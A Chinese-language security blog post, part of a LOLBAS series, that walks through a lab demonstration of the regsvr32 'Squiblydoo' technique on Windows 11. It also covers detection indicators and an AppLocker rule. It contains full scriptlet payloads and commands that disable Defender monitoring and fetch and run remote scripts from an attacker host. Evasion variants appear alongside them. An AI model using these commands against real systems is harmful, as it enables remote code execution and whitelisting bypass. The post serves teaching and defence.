---
title: "LOLBAS鐵人賽Day6Regsvr32.exe深度實戰：Squiblydoo攻擊！"
published: 2025-09-20T15:53:43.000Z
description: "LOLBAS 系列第 6 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

regsvr32.exe 是用來註冊或取消註冊 COM 元件和 DLL，  
系統管理員也偶爾會用它來修復一些元件問題  
但這個工具其實也有個不錯的功能 - 可以執行遠端腳本！  
這個技術又稱為Squiblydoo攻擊，是 LOLBAS 中最經典的技巧之一

今天就來實測 Windows 11 上 regsvr32 的幾個用法

## 環境準備

* * *

今天的實作會需要兩台機器：

```
Attacker Machine: Kali
Victim Machine: Windows 11

```

### Attacker Machine (Kali)：

```bash
# 建立測試目錄
mkdir ~/regsvr32_demo && cd ~/regsvr32_demo

# 建立惡意 SCT 檔案（Scriptlet）
cat > payload.sct << 'EOF'
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="PoC"
    classid="{00000000-0000-0000-0000-000000000000}">
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell");
    r.Run("calc.exe");
    r.Run("cmd.exe /c echo Squiblydoo_Executed > C:\\Windows\\Temp\\regsvr32_test.txt");
]]>
</script>
</registration>
</scriptlet>
EOF

# 建立 PowerShell 版本的 SCT
cat > ps_payload.sct << 'EOF'
<?XML version="1.0"?>
<scriptlet>
<registration progid="PSTest">
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell.exe -c Write-Host 'SCT Executed!' -ForegroundColor Red; calc.exe",0);
]]>
</script>
</registration>
</scriptlet>
EOF

# 建立測試用的正常 DLL 資訊檔
echo "This is not a real DLL" > fake.dll

# 啟動 Web Server
python3 -m http.server 8080

```

### Victim Machine (Windows 11)：

```bash
:: 建立測試環境
mkdir C:\TestLab
cd C:\TestLab

:: 暫時關閉防護（測試環境）
powershell -c "Add-MpPreference -ExclusionPath 'C:\TestLab'"
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

```

## Regsvr32 三大技巧

* * *

### 技巧一：Squiblydoo - 執行遠端 SCT（最經典）

這是 regsvr32 最著名的濫用技術：

```bash
:: 設定攻擊者 IP
set ATTACKER=10.211.55.6

:: 標準 Squiblydoo 攻擊
regsvr32.exe /s /n /u /i:http://%ATTACKER%:8080/payload.sct scrobj.dll

:: 參數說明：
:: /s = 靜默模式（不顯示訊息框）
:: /n = 不呼叫 DllRegisterServer
:: /u = 解除註冊
:: /i: = 呼叫 DllInstall，後面接 URL
:: scrobj.dll = Windows Script Component Runtime

```

執行後會看到計算機彈出，並在 Temp 產生檔案，**完全繞過應用程式白名單**！

### 技巧二：本地 SCT 執行

不一定要遠端，本地檔案也可以：

```bash
:: 下載 SCT 到本地
certutil -urlcache -f http://%ATTACKER%:8080/payload.sct local.sct

:: 執行本地 SCT
regsvr32.exe /s /n /u /i:local.sct scrobj.dll

:: 使用 file:// 協議
regsvr32.exe /s /n /u /i:file://C:\TestLab\local.sct scrobj.dll

:: 甚至可以用 UNC 路徑（內網滲透）
:: regsvr32.exe /s /n /u /i:\\evil-server\share\payload.sct scrobj.dll

```

### 技巧三：混淆與規避

攻擊者會用各種方式混淆：

```bash
:: 方法1：拆分參數
regsvr32 /s /n /u scrobj.dll /i:http://%ATTACKER%:8080/payload.sct

:: 方法2：使用短網址
regsvr32 /s /n /u /i:https://bit.ly/3xYz123 scrobj.dll

:: 方法3：偽裝成正常註冊
regsvr32.exe /s normal.dll
regsvr32.exe /s /n /u /i:http://%ATTACKER%:8080/payload.sct scrobj.dll
regsvr32.exe /s another.dll

:: 方法4：透過 PowerShell 執行
powershell -c "Start-Process regsvr32 -ArgumentList '/s','/n','/u','/i:http://%ATTACKER%:8080/payload.sct','scrobj.dll'"

```

## 偵測＆防禦建議

* * *

### 檢查痕跡

```bash
# 檢查 Temp 資料夾
Get-ChildItem "$env:TEMP" -Filter "*regsvr32*" -ErrorAction SilentlyContinue
Get-ChildItem "C:\TestLab" -Filter "*.sct" -ErrorAction SilentlyContinue

# 檢查事件日誌
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |
    Where-Object {$_.Message -match 'regsvr32.*/i:'} |
    Select-Object TimeCreated, Message

```

### 關鍵偵測指標

*   `regsvr32.exe` + `/i:http` = Squiblydoo 攻擊
*   `regsvr32.exe` + `scrobj.dll` + URL = 可疑
*   `regsvr32.exe` 有網路連線 = 異常（正常註冊不需要網路）
*   `regsvr32.exe` 產生子程序 = 需要調查

## Windows 11 實測心得

* * *

1.  **Squiblydoo 仍然有效** - 這個技術在 Windows 11 還能用
2.  **Windows Defender 會偵測** - 需要先關閉即時防護
3.  **網路連線是關鍵** - regsvr32 正常不應該連網
4.  **SCT 格式很重要** - XML 格式錯誤會失敗

### AppLocker 規則

```xml
<!-- 阻擋 regsvr32 載入 scrobj.dll -->
<FilePathRule Id="Block_Squiblydoo" Name="Block Regsvr32 Squiblydoo" Action="Deny">
  <Conditions>
    <FilePathCondition Path="%SYSTEM32%\regsvr32.exe" />
  </Conditions>
</FilePathRule>

```

### 網路層防護

*   監控 regsvr32.exe 的對外連線
*   阻擋對 .sct 檔案的下載
*   檢查 HTTP User-Agent 是否包含 regsvr32

## 總結！

* * *

Regsvr32 的 Squiblydoo 技術展示了 LOLBAS 的精髓：

*   **合法工具** - 有 Microsoft 簽章
*   **遠端執行** - 可以載入遠端腳本
*   **繞過白名單** - 因為是系統元件

實測發現：

1.  **基本技術仍有效** - `/i:http://` 還能用
2.  **需要正確的 SCT 格式** - XML 結構很重要
3.  **網路活動是破綻** - 正常註冊不需要網路

p.s Squiblydoo 這個名字來自研究員 Casey Smith，因為這個技術太荒謬了（squirrelly），所以取了這個有趣的名字雖然 Microsoft 知道這個問題，但因為向後相容性，很難完全修復